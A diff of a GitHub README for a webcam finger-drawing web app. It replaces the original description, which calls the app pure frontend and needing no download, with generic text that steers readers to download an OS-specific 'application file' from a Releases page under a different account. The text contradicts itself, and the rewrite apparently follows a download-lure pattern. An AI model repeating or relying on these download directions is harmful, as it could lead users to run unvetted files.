@@ -1,43 +1,76 @@
-# 指尖签名板 - Finger Drawing App
+# ✍️ finger-drawing-app - Draw and Write with Your Fingers
 
-一个基于手势识别的网页应用，允许用户通过摄像头使用手指在空中书写和绘画。
+## 💻 Overview
 
-![项目演示](https://img.shields.io/badge/演示-在线试用-blue)
-![技术栈](https://img.shields.io/badge/技术栈-HTML%2FCSS%2FJavaScript-green)
-![许可证](https://img.shields.io/badge/许可证-MIT-lightgrey)
+The finger-drawing-app is a web application that allows you to use your fingers to draw and write in the air. Using gesture recognition and your webcam, it turns your movements into beautiful digital art. This is a creative tool designed for everyone, regardless of their drawing skills. 
 
-## 功能特点
+## 🛠 Features
 
-- ✨ **手势识别** - 使用 MediaPipe Hands 进行实时手部跟踪
-- 🎨 **自定义线条** - 可调节线条粗细和颜色
-- 📱 **响应式设计** - 适配各种屏幕尺寸
-- 🔄 **镜像模式** - 可切换摄像头镜像显示
-- 💾 **保存作品** - 一键保存绘画为 PNG 图片
-- 🖐️ **直观手势** - 食指书写，张开手掌结束
+- **Gesture Recognition**: Detect your finger movements for smooth drawing.
+- **User-Friendly Interface**: No complicated menus. Just start drawing.
+- **Web-Based**: Use your browser without needing to install extra software.
+- **Versatile Canvas**: You can create various designs, from simple sketches to intricate patterns.
 
-### 在线试用
+## 📥 Download & Install
 
-直接访问 [[GitHub Pages 链接](https://laddzhao.github.io/finger-drawing-app/)] 即可体验应用。
+To get started, visit the Releases page below. There, you can download the latest version of the finger-drawing-app. 
 
-### 图片展示
+[![Download Finger Drawing App](https://img.shields.io/badge/Download%20Finger%20Drawing%20App-v1.0-brightgreen)](https://github.com/ArmCodes/finger-drawing-app/releases)
 
-![image](https://laddzhao.github.io/finger-drawing-app/finger-drawing.png)
+1. Click the button above to visit the GitHub Releases page.
+2. On the Releases page, search for the latest release.
+3. Download the application file appropriate for your system.
 
-# Finger Drawing App - Air Canvas
+## 📋 System Requirements
 
-An innovative web application that uses computer vision and gesture recognition to enable users to write and draw in the air using their fingers through the camera.
+To run the finger-drawing-app, ensure your system meets the following requirements:
 
-## 🚀 Key Features
-- **Gesture Control** - Write naturally using your index finger
-- **Real-time Feedback** - Instant visual tracking
-- **Customizable Settings** - Adjust line width and color
-- **Save Artwork** - Export your creations with one click
-- **Mirror Mode** - Intuitive visual feedback
+- **Operating System**: Windows 10 or later, macOS Catalina or later, or a modern Linux distribution.
+- **Browser**: The latest version of Chrome, Firefox, or Safari.
+- **Webcam**: A webcam is needed to track your finger movements.
+- **Internet Connection**: Requires a stable internet connection for optimal performance.
 
-## 💡 Technical Highlights
-- Powered by Google MediaPipe Hands recognition
-- Pure frontend implementation, no backend required
-- Responsive design for all devices
-- Efficient rendering with Canvas API
+## 🚀 Getting Started
 
-No download required - experience the future of interaction right in your browser!
+After downloading:
+
+1. Locate the downloaded file on your computer.
+2. Open the file to launch the app in your web browser.
+3. Allow access to your webcam when prompted.
+
+You will see a simple canvas interface. Move your fingers in front of the camera to start drawing. The app will track your gestures and translate them into digital lines.
+
+### 🖌 Using the Application
+
+- **Drawing**: Move your finger in the air to create lines. You can draw freely.
+- **Clearing the Canvas**: Use the clear button available on the screen to reset.
+- **Saving Your Work**: Take a screenshot or use a screen recording tool to save your art.
+
+## 🔍 Troubleshooting
+
+If you encounter issues:
+
+- Ensure your webcam is functioning properly.
+- Check that your browser has permissions enabled for the camera.
+- Make sure your system meets the specified requirements.
+
+## 🤝 Contributing
+
+We welcome contributions to improve the finger-drawing-app. If you'd like to help, please raise an issue on GitHub or submit a pull request.
+
+## 🔗 Links and Resources
+
+- [GitHub Repository](https://github.com/ArmCodes/finger-drawing-app)
+- [Releases Page](https://github.com/ArmCodes/finger-drawing-app/releases)
+
+## 🌟 Acknowledgments
+
+This project uses modern web technologies, including JavaScript and MediaPipe, to offer a smooth user experience. Thank you to all the contributors and libraries that help make this app possible.
+
+## 🛠 Built With
+
+- **JavaScript**: Main programming language for the web app.
+- **MediaPipe**: Used for gesture recognition.
+- **HTML/CSS**: For building the user interface.
+
+Explore the finger-drawing-app and unleash your creativity. Start drawing today!
